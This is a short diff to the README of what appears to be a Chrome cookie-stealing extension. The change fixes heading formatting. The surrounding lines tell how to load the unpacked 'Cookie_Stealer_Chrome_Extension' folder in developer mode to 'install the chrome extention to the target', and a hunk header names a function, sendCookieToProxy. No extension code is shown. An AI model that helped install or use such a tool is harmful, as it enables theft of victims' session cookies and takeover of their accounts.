@@ -42,7 +42,7 @@ function sendCookieToProxy(cookie) {
 ```
 
 
-#Installation to target:  
+# Installation to target:  
 Open Chrome or Chromium and head to "chrome://extensions/" and turn on developer mode.  
 Once developer mode is enabled click "load unpacked" and set the folder to the "Cookie_Stealer_Chrome_Extension" folder.  
 This will install the chrome extention to the target.  
